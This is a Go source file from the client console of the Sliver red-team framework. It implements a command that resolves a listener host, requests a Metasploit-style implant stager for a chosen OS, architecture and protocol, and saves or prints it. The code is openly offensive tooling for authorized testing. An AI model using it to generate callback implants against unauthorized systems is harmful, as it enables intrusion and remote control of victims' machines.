package generate

import (
	"context"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/desertbit/grumble"
)

func GenerateStagerCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	var stageProto clientpb.StageProtocol
	lhost := ctx.Flags.String("lhost")
	if lhost == "" {
		con.PrintErrorf("Please specify a listening host")
		return
	}
	match, err := regexp.MatchString(`^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$`, lhost)
	if err != nil {
		return
	}
	if !match {
		addr, err := net.LookupHost(lhost)
		if err != nil {
			con.PrintErrorf("Error resolving %s: %v\n", lhost, err)
			return
		}
		if len(addr) > 1 {
			prompt := &survey.Select{
				Message: "Select an address",
				Options: addr,
			}
			err := survey.AskOne(prompt, &lhost)
			if err != nil {
				con.PrintErrorf("Error: %v\n", err)
				return
			}
		} else {
			lhost = addr[0]
		}
	}
	lport := ctx.Flags.Int("lport")
	stageOS := ctx.Flags.String("os")
	arch := ctx.Flags.String("arch")
	proto := ctx.Flags.String("protocol")
	format := ctx.Flags.String("format")
	badchars := ctx.Flags.String("badchars")
	save := ctx.Flags.String("save")

	bChars := make([]string, 0)
	if len(badchars) > 0 {
		for _, b := range strings.Split(badchars, " ") {
			bChars = append(bChars, fmt.Sprintf("\\x%s", b))
		}
	}

	switch proto {
	case "tcp":
		stageProto = clientpb.StageProtocol_TCP
	case "http":
		stageProto = clientpb.StageProtocol_HTTP
	case "https":
		stageProto = clientpb.StageProtocol_HTTPS
	default:
		con.PrintErrorf("%s staging protocol not supported\n", proto)
		return
	}

	ctrl := make(chan bool)
	con.SpinUntil("Generating stager, please wait ...", ctrl)
	stageFile, err := con.Rpc.MsfStage(context.Background(), &clientpb.MsfStagerReq{
		Arch:     arch,
		BadChars: bChars,
		Format:   format,
		Host:     lhost,
		Port:     uint32(lport),
		Protocol: stageProto,
		OS:       stageOS,
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("Error: %v", err)
		return
	}

	if save != "" || format == "raw" {
		saveTo, _ := filepath.Abs(save)
		fi, err := os.Stat(saveTo)
		if err != nil {
			con.PrintErrorf("Failed to generate sliver stager %v\n", err)
			return
		}
		if fi.IsDir() {
			saveTo = filepath.Join(saveTo, stageFile.GetFile().GetName())
		}
		err = ioutil.WriteFile(saveTo, stageFile.GetFile().GetData(), 0700)
		if err != nil {
			con.PrintErrorf("Failed to write to: %s\n", saveTo)
			return
		}
		con.PrintInfof("Sliver implant stager saved to: %s\n", saveTo)
	} else {
		con.PrintInfof("Here's your stager:")
		con.Println(string(stageFile.GetFile().GetData()))
	}
}
